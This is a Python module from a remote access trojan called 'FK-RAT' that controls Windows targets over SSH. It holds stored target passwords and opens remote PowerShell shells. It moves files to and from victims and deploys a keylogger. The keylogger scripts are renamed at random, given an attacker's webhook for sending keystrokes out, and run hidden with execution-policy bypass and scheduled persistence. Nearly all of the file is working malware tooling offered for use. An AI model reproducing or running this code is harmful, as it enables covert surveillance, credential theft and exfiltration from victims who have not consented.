import getpass
import os
import random as ran
import time

from django.core.validators import URLValidator

username = getpass.getuser()
header = f"{username}@FK-RAT"
github_path = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/"
local_path = f"/home/{username}/.FK-RAT" if username != "root" else "/root/.FK-RAT"

# get a random text 
def randomText(lenght = 8):
    LowerCharacters = "abcdefghijklmnopqrstuvwxyz"
    UpperCharacters = "abcdefghijklmnopqrstuvwxyz".upper()
    chars = LowerCharacters + UpperCharacters
    randomText = " ".join((ran.choice(chars) for i in range(lenght)))
    randomTest = ""
    for char in randomText:
        randomTest += char
    return randomTest.replace(" ", "")

# edit a file 
def editFile(path, line, input):
    f = open(f"{path}", 'r')
    lines = f.readlines()
    lines[line - 1] = input + "\n"
    f.close()

    f = open(f"{path}", 'w')
    f.writelines(lines)
    f.close()

# read config file
def read_config(config_file):
    configuration = {}

    time.sleep(2)

    # get file content
    read_lines = open(f"{local_path}/targets/" + config_file, "r").readlines()

    # get target information
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["USERNAME"] = read_lines[2].strip()
    try:
        configuration["KEYLOGGER"] = read_lines[3].strip()
    except IndexError:
        configuration["KEYLOGGER"] = "Not set"
    configuration["TEMPDIR"] = read_lines[4].strip()

    # return config
    return configuration

# Upload File to target with path (SCP)
def remote_upload(upload_file, config, path):
    password = config.get("PASSWORD")
    ip = config.get("IPADDRESS")
    os.system(f"sshpass -p \"{password}\" scp -o StrictHostKeyChecking=accept-new {upload_file} fkrat@{ip}:{path}")

# Download File to target with path (SCP)
def remote_download(config, path):
    password = config.get("PASSWORD")
    ip = config.get("IPADDRESS")

    if not os.path.exists(f"{local_path}/Downloads"):
        os.mkdir(f"{local_path}/Downloads")

    os.system(
        f"sshpass -p \"{password}\" scp -r -o StrictHostKeyChecking=accept-new fkrat@{ip}:{path} {local_path}/Downloads")

# Connects RAT to target        Payload 0
def remoteConsole(file):
    config = read_config(file)
    ipv4 = config.get("IPADDRESS")
    target_password = config.get("PASSWORD")
    username = config.get("USERNAME")

    # remote connect
    os.system("clear")
    print(f"[..] Connecting to {file}")
    os.system(f"sshpass -p \"{target_password}\" ssh fkrat@{ipv4} -o StrictHostKeyChecking=accept-new 'powershell'")

# Keylogger which sends to Webhook or downloads to console device
def keylogger(file):
    print("[!!] This tool isn't finished yet")
    config = read_config(file)
    username = config.get("USERNAME")
    password = config.get("PASSWORD")
    ip = config.get("IPADDRESS")
    tempdir = config.get('TEMPDIR')
    # Setup Keylogger for Target
    if config.get("KEYLOGGER") == "Not set":
        webhook = input("Copy the link of your Webhook here : ")

        try:
            URLValidator()(f"{webhook}")
        except:
            print("[!!] Please enter a existing webhook")
        with open(f"{local_path}/targets/{file}", "r") as f:
            contents = f.readlines()
        contents.insert(3, f"{webhook}")
        with open(f"{local_path}/targets/{file}", "w") as f:
            contents = " ".join(contents)
            f.write(contents)
    webhook = config.get("KEYLOGGER")
    ## Upload Keylogger
    # file paths
    keylogger = f"{local_path}/payloads/Keylogger/keylogger.ps1"
    schedule = f"{local_path}/payloads/Keylogger/schedule.ps1"
    controller = f"{local_path}/payloads/Keylogger/controller.cmd"
    keylogger_task = f"{local_path}/payloads/Keylogger/keylogger-task.ps1"
    
    path = f"C:/Users/{username}/Appdata/Local/Temp/{tempdir}"

    # obfuscate files
    obfuscate_keylogger = randomText(5) + ".ps1"
    obfuscate_schedule = randomText(5) + ".ps1"
    obfuscate_controller = randomText(5) + ".ps1"
    obfuscate_keylogger_task = randomText(5) + ".ps1"

    # file staging
    os.system(f"cp {keylogger} {local_path}/{obfuscate_keylogger}")
    os.system(f"cp {schedule} {local_path}/{obfuscate_schedule}")
    os.system(f"cp {controller} {local_path}/{obfuscate_controller}")
    os.system(f"cp {keylogger_task} {local_path}/{obfuscate_keylogger_task}")

    # Edit files (for names and webhook)
    editFile(f"{local_path}/{obfuscate_keylogger}", 5, f"$Webhook =  \"{webhook.split(' ')[0]}\"")
    editFile(f"{local_path}/{obfuscate_schedule}", 52, f"            powershell Start-Process powershell.exe -windowstyle hidden \"{path}/{obfuscate_keylogger}\"")
    editFile(f"{local_path}/{obfuscate_controller}", 2, f"powershell Start-Process powershell.exe -windowstyle hidden \"{path}/{obfuscate_keylogger}\"")
    editFile(f"{local_path}/{obfuscate_controller}", 3, f"powershell Start-Process powershell.exe -windowstyle hidden \"{path}/{obfuscate_schedule}\"")

    # Upload Files to Target
    remote_upload(f"{local_path}/{obfuscate_keylogger}", config, path)       # Keylogger
    remote_upload(f"{local_path}/{obfuscate_schedule}", config, path)        # Scheduler
    remote_upload(f"{local_path}/{obfuscate_controller}", config, path)      # Controller
    remote_upload(f"{local_path}/{obfuscate_keylogger_task}", config, path)  # Keylogger Task


    # Delete staging files  
    os.system(f"rm {local_path}/{obfuscate_keylogger}")
    os.system(f"rm {local_path}/{obfuscate_schedule}")
    os.system(f"rm {local_path}/{obfuscate_controller}")
    os.system(f"rm {local_path}/{obfuscate_keylogger_task}")

    # Activate Keylogger
    os.system(f"sshpass -p \"{password}\" ssh fkrat@{ip} 'powershell.exe -windowstyle hidden -ep bypass -File \"C:/Users/{username}/AppData/Local/Temp/{tempdir}/{obfuscate_keylogger_task}\" -ArgumentList {tempdir}'")
